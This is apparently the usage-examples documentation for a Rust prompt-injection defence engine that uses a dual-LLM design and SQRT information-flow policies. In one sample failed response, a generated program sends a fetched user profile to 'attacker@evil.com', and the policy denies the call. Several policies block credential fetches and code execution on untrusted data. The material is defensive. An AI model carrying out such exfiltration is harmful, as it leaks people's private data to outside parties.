# Examples

Practical usage examples for the Security Compass Engine, a Rust workspace implementing
the CaMeL dual-LLM architecture for prompt-injection-resistant agentic AI.

All HTTP examples assume the server is running on `localhost:8080` (the default port).

---

## Table of Contents

1. [Basic Request -- Simple Question](#1-basic-request----simple-question)
2. [With SQRT Security Policy -- PII Protection](#2-with-sqrt-security-policy----pii-protection)
3. [Multi-Turn Session](#3-multi-turn-session)
4. [Using OpenRouter Provider](#4-using-openrouter-provider)
5. [Server Authentication](#5-server-authentication)
6. [Fine-Grained Configuration](#6-fine-grained-configuration)
7. [SQRT Policy Examples](#7-sqrt-policy-examples)
8. [Branching Protection with Custom Preset](#8-branching-protection-with-custom-preset)
9. [Using the Orchestrator as a Library (Rust)](#9-using-the-orchestrator-as-a-library-rust)
10. [Response Content Structure](#10-response-content-structure)
11. [Error Responses](#11-error-responses)

---

## 1. Basic Request -- Simple Question

A minimal request with no security policy (default allow). The `X-Api-Key` header
carries your upstream LLM provider key. When no `X-Security-Policy` header is present,
the server compiles an empty SQRT program with `InternalPolicyPreset::default()`, which
defaults to allowing all tool calls.

```bash
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -d '{
    "model": "gpt-4",
    "messages": [
      {"role": "user", "content": "What is the capital of France?"}
    ]
  }'
```

Response:

```json
{
  "id": "chatcmpl-550e8400-e29b-41d4-a716-446655440000",
  "object": "chat.completion",
  "created": 1707123456,
  "model": "gpt-4",
  "choices": [{
    "finish_reason": "stop",
    "index": 0,
    "message": {
      "role": "assistant",
      "content": "{\"status\":\"success\",\"final_return_value\":\"Paris\",\"program\":\"result = \\\"Paris\\\"\",\"raw\":{\"status\":\"success\",\"final_return_value\":\"Paris\",\"error\":null,\"program\":\"result = \\\"Paris\\\"\",\"attempts\":1,\"tool_calls_made\":[],\"print_output\":\"\"}}"
    }
  }],
  "usage": {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0},
  "session_id": "550e8400-e29b-41d4-a716-446655440000"
}
```

Key points:
- The `content` field is a JSON string (not a parsed object). Parse it to access the structured `ResponseContentJsonSchema`.
- The `session_id` at the top level can be used for multi-turn continuation.
- The `X-Session-Id` response header also contains the session ID.

---

## 2. With SQRT Security Policy -- PII Protection

Prevent PII data from being sent to external tools. The `X-Security-Policy` header
carries a JSON object with the SQRT policy source code.

```bash
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -H 'X-Security-Policy: {"language":"sqrt","codes":"let pii_tools = {\"fetch_user_profile\", \"get_medical_records\"};\n\ntool /.*/ {\n  must deny when @args.producers overlaps pii_tools;\n}\n\ntool \"fetch_user_profile\" {\n  result { tags |= {\"pii\"}; producers |= {\"fetch_user_profile\"}; }\n}\n\ntool \"get_medical_records\" {\n  result { tags |= {\"pii\", \"hipaa\"}; producers |= {\"get_medical_records\"}; }\n}"}' \
  -d '{
    "model": "gpt-4",
    "messages": [
      {"role": "user", "content": "Get the user profile and send it via email"}
    ],
    "tools": [
      {
        "type": "function",
        "function": {
          "name": "fetch_user_profile",
          "description": "Fetch user profile data",
          "parameters": {"type": "object", "properties": {"user_id": {"type": "string"}}}
        }
      },
      {
        "type": "function",
        "function": {
          "name": "send_email",
          "description": "Send an email",
          "parameters": {"type": "object", "properties": {"to": {"type": "string"}, "body": {"type": "string"}}}
        }
      }
    ]
  }'
```

**What happens step by step:**

The PLLM generates Python code such as:

```python
data = fetch_user_profile(user_id="123")
send_email(to="user@example.com", body=data)
```

The SQRT policy engine processes each tool call:

1. `fetch_user_profile("123")` is invoked. No `must deny` rule matches it specifically (the wildcard rule checks `@args.producers`, which is empty for the first call). The call is **allowed**.
2. The `result` block fires: the return value is tagged with `pii` and `fetch_user_profile` is added to its `producers` set.
3. `send_email(to="user@example.com", body=data)` is invoked. The `body` argument carries the metadata from step 2: `producers = {"fetch_user_profile"}`. The wildcard rule `tool /.*/` checks `@args.producers overlaps pii_tools`. Since `{"fetch_user_profile"} overlaps {"fetch_user_profile", "get_medical_records"}` is true, the `must deny` rule fires.
4. The email call is **blocked**. The interpreter reports a policy violation.

If `max_pllm_attempts` is greater than 1, the PLLM receives feedback about the denial and can attempt a different approach.

---

## 3. Multi-Turn Session

Continue a conversation across multiple turns using the session ID returned from the
first request.

```bash
# Turn 1: Start a session
RESPONSE=$(curl -s -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -d '{
    "model": "gpt-4",
    "messages": [
      {"role": "user", "content": "Remember that my name is Alice"}
    ]
  }')

SESSION_ID=$(echo $RESPONSE | jq -r '.session_id')
echo "Session: $SESSION_ID"

# Turn 2: Continue the session
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -H "X-Session-Id: $SESSION_ID" \
  -d '{
    "model": "gpt-4",
    "messages": [
      {"role": "user", "content": "What is my name?"}
    ]
  }'
```

Key points:
- The `X-Session-Id` header must be a valid UUID.
- If the session has expired (default TTL: 30 minutes, configurable via `SESSION_TTL_SECS`), the server silently creates a new session.
- Session metadata (tags, producers, consumers) and conversation history persist across turns.
- The maximum number of turns is controlled by `max_n_turns` (default: 5). When exceeded, the server returns a `MaxTurnsExceeded` error.

---

## 4. Using OpenRouter Provider

Route requests through OpenRouter instead of OpenAI by using the `{provider}` path
parameter. The `X-Api-Key` header should carry your OpenRouter API key.

```bash
curl -X POST http://localhost:8080/control/openrouter/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-or-your-openrouter-key" \
  -d '{
    "model": "anthropic/claude-3.5-sonnet",
    "messages": [
      {"role": "user", "content": "Explain quantum computing in one sentence"}
    ]
  }'
```

The default endpoint `POST /control/v1/chat/completions` routes to OpenAI. You can
also use `POST /control/openai/v1/chat/completions` explicitly.

The QLLM model is derived automatically: if the PLLM model starts with `gpt-4`, the
QLLM defaults to `gpt-4o-mini`. Otherwise, it uses the same model as the PLLM.

---

## 5. Server Authentication

When the server is started with the `SEQURITY_API_KEY` environment variable, all
requests must include an `Authorization: Bearer <token>` header.

```bash
# Start server with authentication enabled
SEQURITY_API_KEY=my-secret-key cargo run -p security-compass-server

# Request with authentication
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer my-secret-key" \
  -H "X-Api-Key: sk-your-openai-key" \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Hello"}]
  }'
```

Without the `Authorization` header or with a wrong token, the server returns:

```json
{
  "error": {
    "message": "Unauthorized: missing or invalid API key",
    "type": "unauthorized",
    "code": 401
  }
}
```

When `SEQURITY_API_KEY` is not set or is empty, no server authentication is required.

---

## 6. Fine-Grained Configuration

The `X-Security-Config` header accepts a JSON object that controls orchestrator
behavior. All fields have defaults, so you only need to specify the ones you want to
override.

```bash
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -H 'X-Security-Config: {"max_pllm_attempts": 3, "max_n_turns": 10, "cache_tool_result": "all", "clear_session_meta": "every-turn", "pllm_debug_info_level": "extra", "enabled_internal_tools": ["parse_with_ai", "verify_hypothesis"], "pllm_can_ask_for_clarification": true}' \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Search for recent news about AI safety"}],
    "tools": [
      {
        "type": "function",
        "function": {
          "name": "web_search",
          "description": "Search the web",
          "parameters": {"type": "object", "properties": {"query": {"type": "string"}}}
        }
      }
    ]
  }'
```

### Configuration Reference

| Field | Default | Options | Description |
|---|---|---|---|
| `max_pllm_attempts` | `1` | Any positive integer | Max PLLM retry attempts per turn |
| `merge_system_messages` | `true` | `true`/`false` | Combine multiple system messages into one |
| `max_tool_calls_per_attempt` | `200` | Any positive integer | Cap on tool invocations per PLLM attempt |
| `cache_tool_result` | `"deterministic-only"` | `"none"`, `"all"`, `"deterministic-only"` | Tool result caching strategy |
| `clear_session_meta` | `"never"` | `"never"`, `"every-attempt"`, `"every-turn"` | When to reset session metadata |
| `pllm_debug_info_level` | `"normal"` | `"minimal"`, `"normal"`, `"extra"` | Verbosity of debug info sent to the PLLM on errors |
| `max_n_turns` | `5` | Any positive integer or `null` | Maximum conversation turns per session |
| `enabled_internal_tools` | `["parse_with_ai", "verify_hypothesis"]` | Subset of available tools | Internal tools available to the PLLM |
| `pllm_can_ask_for_clarification` | `true` | `true`/`false` | Whether the PLLM may request user clarification |
| `enable_multi_step_planning` | `false` | `true`/`false` | Enable multi-step planning mode |
| `prune_failed_steps` | `false` | `true`/`false` | Remove failed PLLM attempts from context |
| `disable_rllm` | `true` | `true`/`false` | Disable the response review LLM |
| `show_pllm_secure_var_values` | `"none"` | `"none"`, `"basic_no_text"`, `"basic_executable"`, `"all_executable"` | What secure variable values the PLLM can see |

---

## 7. SQRT Policy Examples

### Data Leak Prevention

Prevent any data from the user database from reaching external APIs:

```sqrt
// Define sensitive data sources and external tool targets
let sensitive_sources = {"user_db", "payment_system", "auth_service"};
let external_tools = {"send_email", "post_to_slack", "upload_file"};

// Block external tools when they receive data from sensitive sources
tool /send_email|post_to_slack|upload_file/ {
    must deny when @args.producers overlaps sensitive_sources;
}

// Tag data coming from the user database
tool "query_user_db" {
    result {
        producers |= {"user_db"};
        tags |= {"pii", "sensitive"};
    }
}

// Tag data coming from the payment system
tool "query_payment" {
    result {
        producers |= {"payment_system"};
        tags |= {"financial", "sensitive"};
    }
}
```

### Tool Access Control

Restrict which tools can be called and under what conditions:

```sqrt
// Unconditionally block dangerous operations
tool "delete_account" {
    must deny;
}

// Allow fund transfers only with clean (un-tainted) data
tool "transfer_funds" {
    must deny when not(@args.tags is_empty);
}

// Read-only tools are safe -- allow and track provenance
tool "read_file" {
    should allow;
    result {
        tags |= {"file_content"};
        producers |= {"filesystem"};
    }
}
```

### Session Metadata Tracking

Use session-level metadata to enforce cross-turn invariants:

```sqrt
// Allow credential fetch only once per session
tool "fetch_credentials" {
    must deny when @session.tags overlaps {"credentials_fetched"};
    session after {
        tags |= {"credentials_fetched"};
    }
    result {
        tags |= {"credential", "sensitive"};
        producers |= {"credential_store"};
    }
}
```

After `fetch_credentials` runs once, the session is tagged with
`credentials_fetched`. Any subsequent attempt to call it in the same session hits the
`must deny` rule.

### Tag-Based Information Flow

Combine tags and producers for multi-hop data flow tracking:

```sqrt
// Sources: tag and track data provenance
tool "fetch_user_email" {
    result {
        tags |= {"email", "pii"};
        producers |= {"user_service"};
    }
}

tool "search_web" {
    result {
        tags |= {"external", "untrusted"};
        producers |= {"web"};
    }
}

// Sinks: block when tainted data flows in
tool "execute_code" {
    must deny when @args.tags overlaps {"untrusted", "external"};
}

tool "send_notification" {
    must deny when @args.tags overlaps {"pii"};
}
```

### Regex Tool Matching

Use regex patterns to apply rules to groups of tools:

```sqrt
// All tools starting with "admin_" require clean data
tool /admin_.*/ {
    must deny when not(@args.tags is_empty);
}

// All tools ending with "_public" are unrestricted
tool /.*_public/ {
    should allow;
}
```

---

## 8. Branching Protection with Custom Preset

The `internal_policy_preset` field within `X-Security-Policy` controls built-in
protections. The branching meta-policy prevents the PLLM-generated code from using
untrusted data in control-flow decisions (`if`, `while`, etc.).

```bash
curl -X POST http://localhost:8080/control/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "X-Api-Key: sk-your-openai-key" \
  -H 'X-Security-Policy: {
    "language": "sqrt",
    "codes": "tool \"fetch_data\" { result { producers |= {\"external\"}; tags |= {\"untrusted\"}; } }",
    "auto_gen": false,
    "internal_policy_preset": {
      "default_allow": true,
      "default_allow_enforcement_level": "soft",
      "enable_non_executable_memory": true,
      "enable_llm_blocked_tag": true,
      "branching_meta_policy": {
        "mode": "deny",
        "producers": ["external"],
        "tags": ["untrusted"],
        "consumers": []
      }
    }
  }' \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Fetch data and process it"}],
    "tools": [
      {
        "type": "function",
        "function": {
          "name": "fetch_data",
          "description": "Fetch external data",
          "parameters": {"type": "object", "properties": {"url": {"type": "string"}}}
        }
      }
    ]
  }'
```

This configuration:

- **`default_allow: true`**: When no SQRT rule matches a tool call, allow it (with `should` enforcement).
- **`enable_non_executable_memory: true`**: Tool results are tagged with `__non_executable`, preventing them from being used as code.
- **`enable_llm_blocked_tag: true`**: Hard deny when the `__llm_blocked` tag is present on any argument.
- **`branching_meta_policy.mode: "deny"`**: Denies branching on data that carries the listed producers or tags. This means if the PLLM generates `if external_data: do_something()`, and `external_data` has `producers = {"external"}` or `tags = {"untrusted"}`, the branch is blocked.

### Preset Field Reference

| Field | Default | Description |
|---|---|---|
| `default_allow` | `true` | Allow tool calls when no matching SQRT rule is found |
| `default_allow_enforcement_level` | `"soft"` | `"soft"` = `should` (retryable), `"hard"` = `must` (fatal) |
| `enable_non_executable_memory` | `true` | Tag tool results as `__non_executable` |
| `enable_llm_blocked_tag` | `true` | Hard deny on `__llm_blocked` tag |
| `branching_meta_policy.mode` | `"deny"` | `"deny"` = blacklist, `"allow"` = whitelist |
| `branching_meta_policy.producers` | `[]` | Producer identifiers to match |
| `branching_meta_policy.tags` | `[]` | Tag identifiers to match |
| `branching_meta_policy.consumers` | `[]` | Consumer identifiers to match |

---

## 9. Using the Orchestrator as a Library (Rust)

The `security-compass-orchestrator` crate can be used directly without the HTTP server.
You implement the `LlmClient` and `ToolExecutor` traits and drive the session yourself.

```rust
use security_compass_orchestrator::{
    CacheMode, CompiledPolicy, InternalPolicyPreset, Interpreter, InterpreterConfig,
    LlmClient, Message, OrchestratorError, Session, SessionConfig, ToolCallSummary,
    ToolDefinition, ToolExecutor, TurnResult, TurnStatus,
};
use security_compass_meta::ValueWithMeta;
use sqrt_eval::compile;
use sqrt_parser::parse;

// ------------------------------------------------------------------
// 1. Implement the LlmClient trait for your LLM provider
// ------------------------------------------------------------------

struct MyLlmClient {
    api_key: String,
}

#[async_trait::async_trait]
impl LlmClient for MyLlmClient {
    async fn chat_completion(
        &self,
        messages: &[Message],
    ) -> Result<String, OrchestratorError> {
        // Call your LLM API and return the assistant's text response.
        // The response should contain a Python code block that the
        // interpreter will execute.
        todo!("Implement LLM API call")
    }

    async fn chat_completion_with_schema(
        &self,
        system_prompt: &str,
        user_message: &str,
        output_schema: &serde_json::Value,
    ) -> Result<serde_json::Value, OrchestratorError> {
        // Call your LLM API with structured output (JSON mode).
        // Used by the QLLM for parse_with_ai and verify_hypothesis.
        todo!("Implement structured LLM API call")
    }
}

// ------------------------------------------------------------------
// 2. Implement the ToolExecutor trait for your tools
// ------------------------------------------------------------------

struct MyToolExecutor;

#[async_trait::async_trait]
impl ToolExecutor for MyToolExecutor {
    async fn execute(
        &self,
        tool_name: &str,
        args: &indexmap::IndexMap<String, ValueWithMeta<serde_json::Value>>,
    ) -> Result<serde_json::Value, OrchestratorError> {
        // Dispatch to the appropriate tool implementation.
        // Use args[key].value for the actual argument values.
        // The metadata (args[key].metadata) is handled by the interpreter.
        match tool_name {
            "web_search" => {
                let query = args.get("query")
                    .and_then(|v| v.value.as_str())
                    .unwrap_or("");
                // Perform the search...
                Ok(serde_json::json!({"results": []}))
            }
            "send_email" => {
                let to = args.get("to")
                    .and_then(|v| v.value.as_str())
                    .unwrap_or("");
                let body = args.get("body")
                    .and_then(|v| v.value.as_str())
                    .unwrap_or("");
                // Send the email...
                Ok(serde_json::json!({"sent": true}))
            }
            _ => Err(OrchestratorError::ToolError {
                tool_name: tool_name.to_string(),
                message: format!("Unknown tool: {}", tool_name),
            }),
        }
    }
}

// ------------------------------------------------------------------
// 3. Wire everything together
// ------------------------------------------------------------------

#[tokio::main]
async fn main() {
    // Compile a SQRT policy
    let policy_source = r#"
        let pii_sources = {"user_service"};

        tool "send_email" {
            must deny when @args.producers overlaps pii_sources;
        }

        tool "fetch_user" {
            result {
                tags |= {"pii"};
                producers |= {"user_service"};
            }
        }
    "#;
    let program = parse(policy_source).expect("Failed to parse SQRT policy");
    let policy = compile(&program, InternalPolicyPreset::default())
        .expect("Failed to compile SQRT policy");

    // Configure the session
    let session_config = SessionConfig {
        max_pllm_attempts: 3,
        max_n_turns: Some(10),
        ..Default::default()
    };

    let interpreter_config = InterpreterConfig {
        max_tool_calls_per_attempt: 50,
        cache_tool_result: CacheMode::DeterministicOnly,
        gas_limit: 0,
        fail_fast: false,
    };

    // Define available tools (parameter names extracted from JSON Schema)
    let tools = vec![
        ToolDefinition {
            name: "web_search".to_string(),
            parameter_names: vec!["query".to_string()],
            deterministic: false,
        },
        ToolDefinition {
            name: "send_email".to_string(),
            parameter_names: vec!["to".to_string(), "body".to_string()],
            deterministic: false,
        },
        ToolDefinition {
            name: "fetch_user".to_string(),
            parameter_names: vec!["user_id".to_string()],
            deterministic: false,
        },
    ];

    // Create the session
    let mut session = Session::new(policy, session_config, interpreter_config, tools);

    // Process a turn
    let llm = MyLlmClient {
        api_key: "sk-...".to_string(),
    };
    let executor = MyToolExecutor;

    let result: TurnResult = session
        .process_turn("Search for AI news and email me a summary", &llm, &executor)
        .await
        .expect("Turn processing failed");

    // Inspect the result
    match result.status {
        TurnStatus::Success => {
            println!("Result: {:?}", result.final_return_value);
            println!("Program: {:?}", result.program);
            println!("Tools called:");
            for call in &result.tool_calls_made {
                println!("  {} -> {}", call.tool_name, call.outcome);
            }
        }
        TurnStatus::ClarificationNeeded => {
            println!("PLLM needs more info: {:?}", result.final_return_value);
        }
        TurnStatus::MaxAttemptsExceeded => {
            println!("All {} attempts failed: {:?}", result.attempts, result.error);
        }
        TurnStatus::Error => {
            println!("Fatal error: {:?}", result.error);
        }
    }

    // Print output captured from the VM
    if !result.print_output.is_empty() {
        println!("VM stdout: {}", result.print_output);
    }
}
```

---

## 10. Response Content Structure

Every response places a JSON-serialized string in `choices[0].message.content`. When
parsed, it has the following structure:

### Successful Response

```json
{
  "status": "success",
  "final_return_value": "The search results show three recent developments...",
  "program": "result = web_search(query=\"AI safety news\")\nresult",
  "raw": {
    "status": "success",
    "final_return_value": "The search results show three recent developments...",
    "error": null,
    "program": "result = web_search(query=\"AI safety news\")\nresult",
    "attempts": 1,
    "tool_calls_made": [
      {"tool_name": "web_search", "outcome": "executed"}
    ],
    "print_output": ""
  }
}
```

### Failed Response (Policy Denial)

When the PLLM repeatedly generates code that violates the policy:

```json
{
  "status": "failure",
  "final_return_value": null,
  "error": {
    "message": "Max PLLM attempts exceeded (3 attempts)",
    "code": "MaxAttemptsExceeded"
  },
  "program": "data = fetch_user_profile(user_id=\"123\")\nsend_email(to=\"attacker@evil.com\", body=data)",
  "raw": {
    "status": "max_attempts_exceeded",
    "final_return_value": null,
    "error": "Max PLLM attempts exceeded (3 attempts)",
    "program": "data = fetch_user_profile(user_id=\"123\")\nsend_email(to=\"attacker@evil.com\", body=data)",
    "attempts": 3,
    "tool_calls_made": [
      {"tool_name": "fetch_user_profile", "outcome": "executed"},
      {"tool_name": "send_email", "outcome": "denied"}
    ],
    "print_output": ""
  }
}
```

### Clarification Response

When the PLLM determines it needs more information from the user:

```json
{
  "status": "unknown",
  "final_return_value": "Could you clarify which user profile you want me to fetch?",
  "program": null,
  "raw": {
    "status": "clarification_needed",
    "final_return_value": "Could you clarify which user profile you want me to fetch?",
    "error": null,
    "program": null,
    "attempts": 1,
    "tool_calls_made": [],
    "print_output": ""
  }
}
```

### Field Reference

| Field | Type | Description |
|---|---|---|
| `status` | `"success"` / `"failure"` / `"unknown"` | Overall turn outcome |
| `final_return_value` | JSON value or `null` | The computed result from the PLLM program |
| `error` | Object or `null` | Error details with `message` and `code` |
| `program` | String or `null` | The Python code the PLLM generated |
| `namespace_screenshot` | JSON value or `null` | VM namespace state snapshot (reserved) |
| `raw` | Object or `null` | Full `TurnResult` for debugging |
| `raw.attempts` | Integer | Number of PLLM attempts that were made |
| `raw.tool_calls_made` | Array | Summary of each tool call with outcome (`"executed"`, `"denied"`, `"cached"`) |
| `raw.print_output` | String | Any `print()` output captured from the VM |

---

## 11. Error Responses

All error responses follow the same JSON structure with an `error` object containing
`message`, `type`, and `code` fields.

### Missing API Key (400)

Returned when the `X-Api-Key` header is absent.

```json
{
  "error": {
    "message": "Missing X-Api-Key header for LLM provider",
    "type": "missing_api_key",
    "code": 400
  }
}
```

### Unauthorized (401)

Returned when `SEQURITY_API_KEY` is set but the `Authorization: Bearer <token>` header
is missing or does not match.

```json
{
  "error": {
    "message": "Unauthorized: missing or invalid API key",
    "type": "unauthorized",
    "code": 401
  }
}
```

### Invalid SQRT Policy (400)

Returned when the SQRT source in `X-Security-Policy` fails to parse or compile.

```json
{
  "error": {
    "message": "Policy compile error: Parse error at line 1, column 5: expected ';'",
    "type": "policy_compile_error",
    "code": 400
  }
}
```

### Unsupported Feature (400)

Returned for features that are not yet implemented, such as streaming or non-SQRT
policy languages.

```json
{
  "error": {
    "message": "Unsupported feature: streaming (stream: true)",
    "type": "unsupported_feature",
    "code": 400
  }
}
```

```json
{
  "error": {
    "message": "Unsupported feature: cedar policy language",
    "type": "unsupported_feature",
    "code": 400
  }
}
```

### No User Message (400)

Returned when the request body contains no message with `"role": "user"`.

```json
{
  "error": {
    "message": "No user message found in request",
    "type": "no_user_message",
    "code": 400
  }
}
```

### Invalid Header (400)

Returned when a JSON header (`X-Security-Policy`, `X-Security-Config`, or
`X-Security-Features`) contains malformed JSON.

```json
{
  "error": {
    "message": "Invalid header x-security-config: expected value at line 1 column 2",
    "type": "invalid_header",
    "code": 400
  }
}
```

### LangGraph Stub (501)

Returned for the `POST /control/lang-graph/{provider}/v1/chat/completions` endpoint,
which is not yet implemented.

```json
{
  "error": {
    "message": "LangGraph endpoint is not yet implemented",
    "type": "unsupported_feature",
    "code": 501
  }
}
```

### Orchestrator Error (500)

Returned when an internal error occurs during turn processing (LLM call failure,
interpreter crash, etc.).

```json
{
  "error": {
    "message": "Orchestrator error: LLM error: request timed out",
    "type": "orchestrator_error",
    "code": 500
  }
}
```
